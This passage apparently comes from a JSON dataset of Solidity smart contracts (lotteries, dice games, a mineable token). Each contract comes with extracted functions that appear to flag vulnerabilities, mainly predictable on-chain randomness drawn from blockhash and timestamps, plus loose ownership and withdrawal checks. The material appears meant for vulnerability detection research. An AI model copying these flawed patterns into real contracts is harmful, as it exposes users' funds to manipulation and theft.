function claimOwnership() onlyPendingOwner public {\n require((block.number <= end) && (block.number >= start));\n emit OwnershipTransferred(owner, pendingOwner);\n owner = pendingOwner;\n pendingOwner = address(0);\n end = 0;\n }\n}\ncontract FlyDropTokenMgr is DelayedClaimable {\n using SafeMath for uint256;\n address[] dropTokenAddrs;\n SimpleFlyDropToken currentDropTokenContract;\n function prepare(uint256 _rand,\n address _from,\n address _token,\n uint256 _value) onlyOwner public returns (bool) {\n require(_token != address(0));\n require(_from != address(0));\n require(_rand > 0);\n if (ERC20(_token).allowance(_from, this) < _value) {\n return false;\n }\n if (_rand > dropTokenAddrs.length) {\n SimpleFlyDropToken dropTokenContract = new SimpleFlyDropToken();\n dropTokenAddrs.push(address(dropTokenContract));\n currentDropTokenContract = dropTokenContract;\n } else {\n currentDropTokenContract = SimpleFlyDropToken(dropTokenAddrs[_rand.sub(1)]);\n }\n currentDropTokenContract.setToken(_token);\n return ERC20(_token).transferFrom(_from, currentDropTokenContract, _value);\n }\n function flyDrop(address[] _destAddrs, uint256[] _values) onlyOwner public returns (uint256) {\n require(address(currentDropTokenContract) != address(0));\n return currentDropTokenContract.multiSend(_destAddrs, _values);\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}",
  "extract_feature": [
    "function claimOwnership() onlyPendingOwner public {\nrequire((block.number <= end) && (block.number >= start));\nemit OwnershipTransferred(owner, pendingOwner);\nowner = pendingOwner;\npendingOwner = address(0);\nend = 0;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b1c"
  },
  "filename": "1297.sol",
  "content": "pragma solidity ^0.4.24;\ncontract BREBuy {\n struct ContractParam {\n uint32 totalSize ;\n uint256 singlePrice;\n uint8 pumpRate;\n bool hasChange;\n }\n address owner = 0x0;\n uint32 gameIndex = 0;\n uint256 totalPrice= 0;\n ContractParam public setConfig;\n ContractParam public curConfig;\n address[] public addressArray = new address[](0);\n event addPlayerEvent(uint32,address);\n event GameOverEvent(uint32,uint32,uint256,uint8,address,uint );\n constructor ( uint32 _totalSize,\n uint256 _singlePrice\n ) public payable {\n owner = msg.sender;\n setConfig = ContractParam(_totalSize,_singlePrice * 1 finney ,5,false);\n curConfig = ContractParam(_totalSize,_singlePrice * 1 finney ,5,false);\n startNewGame();\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) onlyOwner public {\n if (newOwner != address(0)) {\n owner = newOwner;\n }\n }\n function changeConfig( uint32 _totalSize,uint256 _singlePrice,uint8 _pumpRate) onlyOwner public payable {\n curConfig.hasChange = true;\n if(setConfig.totalSize != _totalSize) {\n setConfig.totalSize = _totalSize;\n }\n if(setConfig.pumpRate != _pumpRate){\n setConfig.pumpRate = _pumpRate;\n }\n if(setConfig.singlePrice != _singlePrice * 1 finney){\n setConfig.singlePrice = _singlePrice * 1 finney;\n }\n }\n function startNewGame() private {\n gameIndex++;\n if(curConfig.hasChange) {\n if(curConfig.totalSize != setConfig.totalSize) {\n curConfig.totalSize = setConfig.totalSize;\n }\n if(curConfig.singlePrice != setConfig.singlePrice){\n curConfig.singlePrice = setConfig.singlePrice;\n }\n if( curConfig.pumpRate != setConfig.pumpRate) {\n curConfig.pumpRate = setConfig.pumpRate;\n }\n curConfig.hasChange = false;\n }\n addressArray.length=0;\n }\n function addPlayer() public payable {\n require(msg.value == curConfig.singlePrice);\n totalPrice = totalPrice + msg.value;\n addressArray.push(msg.sender);\n emit addPlayerEvent(gameIndex,msg.sender);\n if(addressArray.length >= curConfig.totalSize) {\n gameResult();\n startNewGame();\n }\n }\n function getGameInfo() public view returns (uint256,uint32,uint256,uint8,address[],uint256) {\n return (gameIndex,\n curConfig.totalSize,\n curConfig.singlePrice,\n curConfig.pumpRate,\n addressArray,\n totalPrice);\n }\n function getSelfCount() private view returns (uint32) {\n uint32 count = 0;\n for(uint i = 0; i < addressArray.length; i++) {\n if(msg.sender == addressArray[i]) {\n count++;\n }\n }\n return count;\n }\n function gameResult() private {\n uint index = getRamdon();\n address lastAddress = addressArray[index];\n uint totalBalace = address(this).balance;\n uint giveToOwn = totalBalace * curConfig.pumpRate / 100;\n uint giveToActor = totalBalace - giveToOwn;\n owner.transfer(giveToOwn);\n lastAddress.transfer(giveToActor);\n emit GameOverEvent(\n gameIndex,\n curConfig.totalSize,\n curConfig.singlePrice,\n curConfig.pumpRate,\n lastAddress,\n now);\n }\n function getRamdon() private view returns (uint) {\n bytes32 ramdon = keccak256(abi.encodePacked(ramdon,now,blockhash(block.number-1)));\n for(uint i = 0; i < addressArray.length; i++) {\n ramdon = keccak256(abi.encodePacked(ramdon,now, addressArray[i]));\n }\n uint index = uint(ramdon) % addressArray.length;\n return index;\n }\n}",
  "extract_feature": [
    "function getRamdon() private view returns (uint) {\nbytes32 ramdon = keccak256(abi.encodePacked(ramdon,now,blockhash(block.number-1)));\nfor(uint i = 0; i < addressArray.length; i++) {\nramdon = keccak256(abi.encodePacked(ramdon,now, addressArray[i]));\n}\nuint index = uint(ramdon) % addressArray.length;\nreturn index;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b1d"
  },
  "filename": "1335.sol",
  "content": "pragma solidity ^0.4.22;\ncontract Lottery {\n address owner;\n address public beneficiary;\n mapping(address => bool) public playersMap;\n address[] public players;\n uint public playerEther = 0.01 ether;\n uint playerCountGoal;\n bool public isLotteryClosed = false;\n uint public rewards;\n event GoalReached(address recipient, uint totalAmountRaised);\n event FundTransfer(address backer, uint amount, bool isContribution);\n constructor() public {\n playerCountGoal = 10000 + randomGen(block.number - 1, 101);\n owner = msg.sender;\n }\n function () public payable {\n require(!isLotteryClosed && msg.value == playerEther, \"Lottery should not be closed and player should send exact ethers\");\n require(!playersMap[msg.sender], \"player should not attend twice\");\n players.push(msg.sender);\n playersMap[msg.sender] = true;\n emit FundTransfer(msg.sender, msg.value, true);\n checkGoalReached();\n }\n modifier afterGoalReached() {\n if (players.length >= playerCountGoal) _;\n }\n function checkGoalReached() internal afterGoalReached {\n require(!isLotteryClosed, \"lottery must be opened\");\n isLotteryClosed = true;\n uint playerCount = players.length;\n uint winnerIndex = randomGen(block.number - 2, playerCount);\n beneficiary = players[winnerIndex];\n rewards = playerEther * playerCount * 4 / 5;\n emit GoalReached(beneficiary, rewards);\n }\n function randomGen(uint seed, uint count) private view returns (uint randomNumber) {\n return uint(keccak256(abi.encodePacked(block.number-3, seed))) % count;\n }\n function safeWithdrawal() public afterGoalReached {\n require(isLotteryClosed, \"lottery must be closed\");\n if (beneficiary == msg.sender) {\n beneficiary.transfer(rewards);\n emit FundTransfer(beneficiary, rewards, false);\n }\n if (owner == msg.sender) {\n uint fee = playerEther * players.length / 5;\n owner.transfer(fee);\n emit FundTransfer(owner, fee, false);\n }\n }\n}",
  "extract_feature": [
    "function checkGoalReached() internal afterGoalReached {\nrequire(!isLotteryClosed, \"lottery must be opened\");\nisLotteryClosed = true;\nuint playerCount = players.length;\nuint winnerIndex = randomGen(block.number - 2, playerCount);\nbeneficiary = players[winnerIndex];\nrewards = playerEther * playerCount * 4 / 5;\nemit GoalReached(beneficiary, rewards);\n}",
    "function randomGen(uint seed, uint count) private view returns (uint randomNumber) {\nreturn uint(keccak256(abi.encodePacked(block.number-3, seed))) % count;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b1e"
  },
  "filename": "1338.sol",
  "content": "pragma solidity ^0.4.18;\nlibrary SafeMath {\n function add(uint a, uint b) internal pure returns (uint c) {\n c = a + b;\n require(c >= a);\n }\n function sub(uint a, uint b) internal pure returns (uint c) {\n require(b <= a);\n c = a - b;\n }\n function mul(uint a, uint b) internal pure returns (uint c) {\n c = a * b;\n require(a == 0 || c / a == b);\n }\n function div(uint a, uint b) internal pure returns (uint c) {\n require(b > 0);\n c = a / b;\n }\n}\nlibrary ExtendedMath {\n function limitLessThan(uint a, uint b) internal pure returns (uint c) {\n if(a > b) return b;\n return a;\n }\n}\ncontract ERC20Interface {\n function totalSupply() public constant returns (uint);\n function balanceOf(address tokenOwner) public constant returns (uint balance);\n function allowance(address tokenOwner, address spender) public constant returns (uint remaining);\n function transfer(address to, uint tokens) public returns (bool success);\n function approve(address spender, uint tokens) public returns (bool success);\n function transferFrom(address from, address to, uint tokens) public returns (bool success);\n event Transfer(address indexed from, address indexed to, uint tokens);\n event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n}\ncontract ApproveAndCallFallBack {\n function receiveApproval(address from, uint256 tokens, address token, bytes data) public;\n}\ncontract Owned {\n address public owner;\n address public newOwner;\n event OwnershipTransferred(address indexed _from, address indexed _to);\n function Owned() public {\n owner = msg.sender;\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n newOwner = _newOwner;\n }\n function acceptOwnership() public {\n require(msg.sender == newOwner);\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n newOwner = address(0);\n }\n}\ncontract ERC918Interface {\n function mint(uint256 nonce, bytes32 challenge_digest) public returns (bool success);\n function getChallengeNumber() public constant returns (bytes32);\n function getMiningDifficulty() public constant returns (uint);\n function getMiningTarget() public constant returns (uint);\n function getMiningReward() public constant returns (uint);\n event Mint(address indexed from, uint reward_amount, uint epochCount, bytes32 newChallengeNumber);\n address public lastRewardTo;\n uint public lastRewardAmount;\n uint public lastRewardEthBlockNumber;\n bytes32 public challengeNumber;\n}\ncontract _0xGoldToken is ERC20Interface, Owned, ERC918Interface {\n using SafeMath for uint;\n using ExtendedMath for uint;\n string public symbol;\n string public name;\n uint8 public decimals;\n uint public _totalSupply;\n uint public latestDifficultyPeriodStarted;\n uint public epochCount;\n uint public _BLOCKS_PER_READJUSTMENT = 100;\n uint public _MINIMUM_TARGET = 2**16;\n uint public _MAXIMUM_TARGET = 2**234;\n address public parentAddress;\n uint public miningTarget;\n bytes32 public challengeNumber;\n uint public rewardEra;\n uint public maxSupplyForEra;\n address public lastRewardTo;\n uint public lastRewardAmount;\n uint public lastRewardEthBlockNumber;\n bool locked = false;\n mapping(bytes32 => bytes32) solutionForChallenge;\n uint public tokensMinted;\n mapping(address => uint) balances;\n mapping(address => mapping(address => uint)) allowed;\n function _0xGoldToken() public onlyOwner{\n symbol = \"0xGOLD\";\n name = \"0xGold Token\";\n decimals = 10;\n _totalSupply = 5000000 * 10**uint(decimals);\n if(locked) revert();\n locked = true;\n tokensMinted = 500000000000000;\n rewardEra = 0;\n maxSupplyForEra = _totalSupply.div(2);\n miningTarget = _MAXIMUM_TARGET;\n latestDifficultyPeriodStarted = block.number;\n _startNewMiningEpoch();\n parentAddress = 0xB6eD7644C69416d67B522e20bC294A9a9B405B31;\n balances[owner] = tokensMinted;\n Transfer(address(0), owner, tokensMinted);\n }\n function mint(uint256 nonce, bytes32 challenge_digest) public returns (bool success) {\n bytes32 digest = keccak256(challengeNumber, msg.sender, nonce );\n if (digest != challenge_digest) revert();\n if(uint256(digest) > miningTarget) revert();\n bytes32 solution = solutionForChallenge[challengeNumber];\n solutionForChallenge[challengeNumber] = digest;\n if(solution != 0x0) revert();\n uint reward_amount = getMiningReward();\n balances[msg.sender] = balances[msg.sender].add(reward_amount);\n tokensMinted = tokensMinted.add(reward_amount);\n assert(tokensMinted <= maxSupplyForEra);\n lastRewardTo = msg.sender;\n lastRewardAmount = reward_amount;\n lastRewardEthBlockNumber = block.number;\n _startNewMiningEpoch();\n Mint(msg.sender, reward_amount, epochCount, challengeNumber );\n return true;\n }\n function _startNewMiningEpoch() internal {\n if( tokensMinted.add(getMiningReward()) > maxSupplyForEra && rewardEra < 2)\n {\n rewardEra = rewardEra + 1;\n }\n maxSupplyForEra = _totalSupply - _totalSupply.div( 2**(rewardEra + 1));\n epochCount = epochCount.add(1);\n if(epochCount % _BLOCKS_PER_READJUSTMENT == 0)\n {\n _reAdjustDifficulty();\n }\n challengeNumber = block.blockhash(block.number - 1);\n }\n function _reAdjustDifficulty() internal {\n uint ethBlocksSinceLastDifficultyPeriod = block.number - latestDifficultyPeriodStarted;\n uint epochsMined = _BLOCKS_PER_READJUSTMENT;\n uint targetEthBlocksPerDiffPeriod = epochsMined * 28;\n if( ethBlocksSinceLastDifficultyPeriod < targetEthBlocksPerDiffPeriod )\n {\n uint excess_block_pct = (targetEthBlocksPerDiffPeriod.mul(100)).div( ethBlocksSinceLastDifficultyPeriod );\n uint excess_block_pct_extra = excess_block_pct.sub(100).limitLessThan(1000);\n miningTarget = miningTarget.sub(miningTarget.div(2000).mul(excess_block_pct_extra));\n }else{\n uint shortage_block_pct = (ethBlocksSinceLastDifficultyPeriod.mul(100)).div( targetEthBlocksPerDiffPeriod );\n uint shortage_block_pct_extra = shortage_block_pct.sub(100).limitLessThan(1000);\n miningTarget = miningTarget.add(miningTarget.div(2000).mul(shortage_block_pct_extra));\n }\n latestDifficultyPeriodStarted = block.number;\n if(miningTarget < _MINIMUM_TARGET)\n {\n miningTarget = _MINIMUM_TARGET;\n }\n if(miningTarget > _MAXIMUM_TARGET)\n {\n miningTarget = _MAXIMUM_TARGET;\n }\n }\n function getChallengeNumber() public constant returns (bytes32) {\n return challengeNumber;\n }\n function getMiningDifficulty() public constant returns (uint) {\n return _MAXIMUM_TARGET.div(miningTarget);\n }\n function getMiningTarget() public constant returns (uint) {\n return miningTarget;\n }\n function getMiningReward() public constant returns (uint) {\n return (16 * 10**uint(decimals) ).div( 2**rewardEra ) ;\n }\n function getMintDigest(uint256 nonce, bytes32 challenge_digest, bytes32 challenge_number) public view returns (bytes32 digesttest) {\n bytes32 digest = keccak256(challenge_number,msg.sender,nonce);\n return digest;\n }\n function checkMintSolution(uint256 nonce, bytes32 challenge_digest, bytes32 challenge_number, uint testTarget) public view returns (bool success) {\n bytes32 digest = keccak256(challenge_number,msg.sender,nonce);\n if(uint256(digest) > testTarget) revert();\n return (digest == challenge_digest);\n }\n function totalSupply() public constant returns (uint) {\n return _totalSupply - balances[address(0)];\n }\n function balanceOf(address tokenOwner) public constant returns (uint balance) {\n return balances[tokenOwner];\n }\n function transfer(address to, uint tokens) public returns (bool success) {\n balances[msg.sender] = balances[msg.sender].sub(tokens);\n balances[to] = balances[to].add(tokens);\n Transfer(msg.sender, to, tokens);\n return true;\n }\n function approve(address spender, uint tokens) public returns (bool success) {\n allowed[msg.sender][spender] = tokens;\n Approval(msg.sender, spender, tokens);\n return true;\n }\n function transferFrom(address from, address to, uint tokens) public returns (bool success) {\n balances[from] = balances[from].sub(tokens);\n allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);\n balances[to] = balances[to].add(tokens);\n Transfer(from, to, tokens);\n return true;\n }\n function allowance(address tokenOwner, address spender) public constant returns (uint remaining) {\n return allowed[tokenOwner][spender];\n }\n function approveAndCall(address spender, uint tokens, bytes data) public returns (bool success) {\n allowed[msg.sender][spender] = tokens;\n Approval(msg.sender, spender, tokens);\n ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, this, data);\n return true;\n }\n function () public payable {\n revert();\n }\n function transferAnyERC20Token(address tokenAddress, uint tokens) public onlyOwner returns (bool success) {\n return ERC20Interface(tokenAddress).transfer(owner, tokens);\n }\n function merge() public returns (bool success) {\n bytes32 future_challengeNumber = block.blockhash(block.number - 1);\n if(challengeNumber == future_challengeNumber){\n return false;\n }\n if(ERC918Interface(parentAddress).lastRewardTo() != msg.sender){\n return false;\n }\n if(ERC918Interface(parentAddress).lastRewardEthBlockNumber() != block.number){\n return false;\n }\n bytes32 parentChallengeNumber = ERC918Interface(parentAddress).challengeNumber();\n bytes32 solution = solutionForChallenge[parentChallengeNumber];\n if(solution != 0x0) return false;\n bytes32 digest = 'merge';\n solutionForChallenge[parentChallengeNumber] = digest;\n uint reward_amount = getMiningReward();\n balances[msg.sender] = balances[msg.sender].add(reward_amount);\n tokensMinted = tokensMinted.add(reward_amount);\n assert(tokensMinted <= maxSupplyForEra);\n lastRewardTo = msg.sender;\n lastRewardAmount = reward_amount;\n lastRewardEthBlockNumber = block.number;\n _startNewMiningEpoch();\n Mint(msg.sender, reward_amount, epochCount, 0 );\n return true;\n }\n}",
  "extract_feature": [
    "function _0xGoldToken() public onlyOwner{\nsymbol = \"0xGOLD\";\nname = \"0xGold Token\";\ndecimals = 10;\n_totalSupply = 5000000 * 10**uint(decimals);\nif(locked) revert();\nlocked = true;\ntokensMinted = 500000000000000;\nrewardEra = 0;\nmaxSupplyForEra = _totalSupply.div(2);\nminingTarget = _MAXIMUM_TARGET;\nlatestDifficultyPeriodStarted = block.number;\n_startNewMiningEpoch();\nparentAddress = 0xB6eD7644C69416d67B522e20bC294A9a9B405B31;\nbalances[owner] = tokensMinted;\nTransfer(address(0), owner, tokensMinted);\n}",
    "function mint(uint256 nonce, bytes32 challenge_digest) public returns (bool success) {\nbytes32 digest = keccak256(challengeNumber, msg.sender, nonce );\nif (digest != challenge_digest) revert();\nif(uint256(digest) > miningTarget) revert();\nbytes32 solution = solutionForChallenge[challengeNumber];\nsolutionForChallenge[challengeNumber] = digest;\nif(solution != 0x0) revert();\nuint reward_amount = getMiningReward();\nbalances[msg.sender] = balances[msg.sender].add(reward_amount);\ntokensMinted = tokensMinted.add(reward_amount);\nassert(tokensMinted <= maxSupplyForEra);\nlastRewardTo = msg.sender;\nlastRewardAmount = reward_amount;\nlastRewardEthBlockNumber = block.number;\n_startNewMiningEpoch();\nMint(msg.sender, reward_amount, epochCount, challengeNumber );\nreturn true;\n}",
    "function _startNewMiningEpoch() internal {\nif( tokensMinted.add(getMiningReward()) > maxSupplyForEra && rewardEra < 2)\n{\nrewardEra = rewardEra + 1;\n}\nmaxSupplyForEra = _totalSupply - _totalSupply.div( 2**(rewardEra + 1));\nepochCount = epochCount.add(1);\nif(epochCount % _BLOCKS_PER_READJUSTMENT == 0)\n{\n_reAdjustDifficulty();\n}\nchallengeNumber = block.blockhash(block.number - 1);\n}",
    "function _reAdjustDifficulty() internal {\nuint ethBlocksSinceLastDifficultyPeriod = block.number - latestDifficultyPeriodStarted;\nuint epochsMined = _BLOCKS_PER_READJUSTMENT;\nuint targetEthBlocksPerDiffPeriod = epochsMined * 28;\nif( ethBlocksSinceLastDifficultyPeriod < targetEthBlocksPerDiffPeriod )\n{\nuint excess_block_pct = (targetEthBlocksPerDiffPeriod.mul(100)).div( ethBlocksSinceLastDifficultyPeriod );\nuint excess_block_pct_extra = excess_block_pct.sub(100).limitLessThan(1000);\nminingTarget = miningTarget.sub(miningTarget.div(2000).mul(excess_block_pct_extra));\n}else{\nuint shortage_block_pct = (ethBlocksSinceLastDifficultyPeriod.mul(100)).div( targetEthBlocksPerDiffPeriod );\nuint shortage_block_pct_extra = shortage_block_pct.sub(100).limitLessThan(1000);\nminingTarget = miningTarget.add(miningTarget.div(2000).mul(shortage_block_pct_extra));\n}\nlatestDifficultyPeriodStarted = block.number;\nif(miningTarget < _MINIMUM_TARGET)\n{\nminingTarget = _MINIMUM_TARGET;\n}\nif(miningTarget > _MAXIMUM_TARGET)\n{\nminingTarget = _MAXIMUM_TARGET;\n}\n}",
    "function merge() public returns (bool success) {\nbytes32 future_challengeNumber = block.blockhash(block.number - 1);\nif(challengeNumber == future_challengeNumber){\nreturn false;\n}\nif(ERC918Interface(parentAddress).lastRewardTo() != msg.sender){\nreturn false;\n}\nif(ERC918Interface(parentAddress).lastRewardEthBlockNumber() != block.number){\nreturn false;\n}\nbytes32 parentChallengeNumber = ERC918Interface(parentAddress).challengeNumber();\nbytes32 solution = solutionForChallenge[parentChallengeNumber];\nif(solution != 0x0) return false;\nbytes32 digest = 'merge';\nsolutionForChallenge[parentChallengeNumber] = digest;\nuint reward_amount = getMiningReward();\nbalances[msg.sender] = balances[msg.sender].add(reward_amount);\ntokensMinted = tokensMinted.add(reward_amount);\nassert(tokensMinted <= maxSupplyForEra);\nlastRewardTo = msg.sender;\nlastRewardAmount = reward_amount;\nlastRewardEthBlockNumber = block.number;\n_startNewMiningEpoch();\nMint(msg.sender, reward_amount, epochCount, 0 );\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc68750a970a4fdc0b1f"
  },
  "filename": "1345.sol",
  "content": "pragma solidity ^0.4.24;\ncontract ZethrTokenBankroll{\n function gameRequestTokens(address target, uint tokens) public;\n}\ncontract ZethrMainBankroll{\n function gameGetTokenBankrollList() public view returns (address[7]);\n}\ncontract ZethrInterface{\n function withdraw() public;\n}\nlibrary ZethrTierLibrary{\n uint constant internal magnitude = 2**64;\n function getTier(uint divRate) internal pure returns (uint){\n uint actualDiv = divRate;\n if (actualDiv >= 30){\n return 6;\n } else if (actualDiv >= 25){\n return 5;\n } else if (actualDiv >= 20){\n return 4;\n } else if (actualDiv >= 15){\n return 3;\n } else if (actualDiv >= 10){\n return 2;\n } else if (actualDiv >= 5){\n return 1;\n } else if (actualDiv >= 2){\n return 0;\n } else{\n revert();\n }\n }\n}\ncontract ZethrBankrollBridge{\n ZethrInterface Zethr;\n address[7] UsedBankrollAddresses;\n mapping(address => bool) ValidBankrollAddress;\n function setupBankrollInterface(address ZethrMainBankrollAddress) internal {\n UsedBankrollAddresses = ZethrMainBankroll(ZethrMainBankrollAddress).gameGetTokenBankrollList();\n for(uint i=0; i<7; i++){\n ValidBankrollAddress[UsedBankrollAddresses[i]] = true;\n }\n }\n modifier fromBankroll(){\n require(ValidBankrollAddress[msg.sender], \"msg.sender should be a valid bankroll\");\n _;\n }\n function RequestBankrollPayment(address to, uint tokens, uint userDivRate) internal {\n uint tier = ZethrTierLibrary.getTier(userDivRate);\n address tokenBankrollAddress = UsedBankrollAddresses[tier];\n ZethrTokenBankroll(tokenBankrollAddress).gameRequestTokens(to, tokens);\n }\n}\ncontract ZethrShell is ZethrBankrollBridge{\n function WithdrawToBankroll() public {\n address(UsedBankrollAddresses[0]).transfer(address(this).balance);\n }\n function WithdrawAndTransferToBankroll() public {\n Zethr.withdraw();\n WithdrawToBankroll();\n }\n}\ncontract Zethroll is ZethrShell {\n using SafeMath for uint;\n modifier betIsValid(uint _betSize, uint _playerNumber, uint divRate) {\n require( calculateProfit(_betSize, _playerNumber) < getMaxProfit(divRate)\n && _betSize >= minBet\n && _playerNumber >= minNumber\n && _playerNumber <= maxNumber);\n _;\n }\n modifier gameIsActive {\n require(gamePaused == false);\n _;\n }\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n uint constant private MAX_INT = 2 ** 256 - 1;\n uint constant public maxProfitDivisor = 1000000;\n uint constant public maxNumber = 100;\n uint constant public minNumber = 2;\n uint constant public houseEdgeDivisor = 1000;\n bool public gamePaused;\n address public owner;\n mapping (uint => uint) public contractBalance;\n mapping (uint => uint) public maxProfit;\n uint public houseEdge;\n uint public maxProfitAsPercentOfHouse;\n uint public minBet = 0;\n uint public totalBets;\n uint public totalZTHWagered;\n event LogBet(address sender, uint value, uint rollUnder);\n event LogResult(address player, uint result, uint rollUnder, uint profit, uint tokensBetted, bool won);\n event LogOwnerTransfer(address indexed SentToAddress, uint indexed AmountTransferred);\n event MaxProfitChanged(uint _oldMaxProfit, uint _newMaxProfit);\n event CurrentContractBalance(uint _tokens);\n constructor (address ZethrMainBankrollAddress) public {\n setupBankrollInterface(ZethrMainBankrollAddress);\n owner = msg.sender;\n houseEdge = 990;\n ownerSetMaxProfitAsPercentOfHouse(10000);\n ownerSetMinBet(1e18);\n }\n function maxRandom(uint blockn, address entropy) public view returns (uint256 randomNumber) {\n return uint256(keccak256(\n abi.encodePacked(\n blockhash(blockn),\n entropy)\n ));\n }\n function random(uint256 upper, uint256 blockn, address entropy) public view returns (uint256 randomNumber) {\n return maxRandom(blockn, entropy) % upper;\n }\n function calculateProfit(uint _initBet, uint _roll)\n private\n view\n returns (uint)\n {\n return ((((_initBet * (100 - (_roll.sub(1)))) / (_roll.sub(1)) + _initBet)) * houseEdge / houseEdgeDivisor) - _initBet;\n }\n struct playerRoll{\n uint192 tokenValue;\n uint48 blockn;\n uint8 rollUnder;\n uint8 divRate;\n }\n mapping(address => playerRoll) public playerRolls;\n function _playerRollDice(uint _rollUnder, TKN _tkn, uint userDivRate) private\n gameIsActive\n betIsValid(_tkn.value, _rollUnder, userDivRate)\n {\n require(_tkn.value < ((2 ** 192) - 1));\n require(block.number < ((2 ** 48) - 1));\n require(userDivRate < (2 ** 8 - 1));\n playerRoll memory roll = playerRolls[_tkn.sender];\n require(block.number != roll.blockn);\n if (roll.blockn != 0) {\n _finishBet(_tkn.sender);\n }\n roll.blockn = uint48(block.number);\n roll.tokenValue = uint192(_tkn.value);\n roll.rollUnder = uint8(_rollUnder);\n roll.divRate = uint8(userDivRate);\n playerRolls[_tkn.sender] = roll;\n emit LogBet(_tkn.sender, _tkn.value, _rollUnder);\n totalBets += 1;\n totalZTHWagered += _tkn.value;\n }\n function finishBet() public\n gameIsActive\n returns (uint)\n {\n return _finishBet(msg.sender);\n }\n function _finishBet(address target) private returns (uint){\n playerRoll memory roll = playerRolls[target];\n require(roll.tokenValue > 0);\n require(roll.blockn != block.number);\n uint result;\n if (block.number - roll.blockn > 255) {\n result = 1000;\n } else {\n result = random(100, roll.blockn, target) + 1;\n }\n uint rollUnder = roll.rollUnder;\n if (result < rollUnder) {\n uint profit = calculateProfit(roll.tokenValue, rollUnder);\n uint mProfit = getMaxProfit(roll.divRate);\n if (profit > mProfit){\n profit = mProfit;\n }\n subContractBalance(roll.divRate, profit);\n emit LogResult(target, result, rollUnder, profit, roll.tokenValue, true);\n setMaxProfit(roll.divRate);\n playerRolls[target] = playerRoll(uint192(0), uint48(0), uint8(0), uint8(0));\n RequestBankrollPayment(target, profit + roll.tokenValue, roll.divRate);\n return result;\n } else {\n emit LogResult(target, result, rollUnder, profit, roll.tokenValue, false);\n addContractBalance(roll.divRate, roll.tokenValue);\n playerRolls[target] = playerRoll(uint192(0), uint48(0), uint8(0), uint8(0));\n setMaxProfit(roll.divRate);\n return result;\n }\n }\n struct TKN {address sender; uint value;}\n function execute(address _from, uint _value, uint userDivRate, bytes _data) public fromBankroll gameIsActive returns (bool) {\n TKN memory _tkn;\n _tkn.sender = _from;\n _tkn.value = _value;\n uint8 chosenNumber = uint8(_data[0]);\n _playerRollDice(chosenNumber, _tkn, userDivRate);\n return true;\n }\n function setMaxProfit(uint divRate) internal {\n maxProfit[divRate] = (contractBalance[divRate] * maxProfitAsPercentOfHouse) / maxProfitDivisor;\n }\n function getMaxProfit(uint divRate) public view returns (uint){\n return (contractBalance[divRate] * maxProfitAsPercentOfHouse) / maxProfitDivisor;\n }\n function subContractBalance(uint divRate, uint sub) internal {\n contractBalance[divRate] = contractBalance[divRate].sub(sub);\n }\n function addContractBalance(uint divRate, uint add) internal {\n contractBalance[divRate] = contractBalance[divRate].add(add);\n }\n function ownerUpdateContractBalance(uint newContractBalance, uint divRate) public\n onlyOwner\n {\n contractBalance[divRate] = newContractBalance;\n }\n function bankrollExternalUpdateTokens(uint divRate, uint newBalance) public fromBankroll {\n contractBalance[divRate] = newBalance;\n setMaxProfit(divRate);\n }\n function ownerSetMaxProfitAsPercentOfHouse(uint newMaxProfitAsPercent) public\n onlyOwner\n {\n require(newMaxProfitAsPercent <= 200000);\n maxProfitAsPercentOfHouse = newMaxProfitAsPercent;\n setMaxProfit(2);\n setMaxProfit(5);\n setMaxProfit(10);\n setMaxProfit(15);\n setMaxProfit(20);\n setMaxProfit(25);\n setMaxProfit(33);\n }\n function ownerSetMinBet(uint newMinimumBet) public\n onlyOwner\n {\n minBet = newMinimumBet;\n }\n function ownerPauseGame(bool newStatus) public\n onlyOwner\n {\n gamePaused = newStatus;\n }\n function ownerChangeOwner(address newOwner) public\n onlyOwner\n {\n owner = newOwner;\n }\n function ownerkill() public\n onlyOwner\n {\n selfdestruct(owner);\n }\n}\nlibrary SafeMath {\n function mul(uint a, uint b) internal pure returns (uint) {\n if (a == 0) {\n return 0;\n }\n uint c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint a, uint b) internal pure returns (uint) {\n uint c = a / b;\n return c;\n }\n function sub(uint a, uint b) internal pure returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function add(uint a, uint b) internal pure returns (uint) {\n uint c = a + b;\n assert(c >= a);\n return c;\n }\n}",
  "extract_feature": [
    "function _finishBet(address target) private returns (uint){\nplayerRoll memory roll = playerRolls[target];\nrequire(roll.tokenValue > 0);\nrequire(roll.blockn != block.number);\nuint result;\nif (block.number - roll.blockn > 255) {\nresult = 1000;\n} else {\nresult = random(100, roll.blockn, target) + 1;\n}\nuint rollUnder = roll.rollUnder;\nif (result < rollUnder) {\nuint profit = calculateProfit(roll.tokenValue, rollUnder);\nuint mProfit = getMaxProfit(roll.divRate);\nif (profit > mProfit){\nprofit = mProfit;\n}\nsubContractBalance(roll.divRate, profit);\nemit LogResult(target, result, rollUnder, profit, roll.tokenValue, true);\nsetMaxProfit(roll.divRate);\nplayerRolls[target] = playerRoll(uint192(0), uint48(0), uint8(0), uint8(0));\nRequestBankrollPayment(target, profit + roll.tokenValue, roll.divRate);\nreturn result;\n} else {\nemit LogResult(target, result, rollUnder, profit, roll.tokenValue, false);\naddContractBalance(roll.divRate, roll.tokenValue);\nplayerRolls[target] = playerRoll(uint192(0), uint48(0), uint8(0), uint8(0));\nsetMaxProfit(roll.divRate);\nreturn result;\n}\n}"
  ]
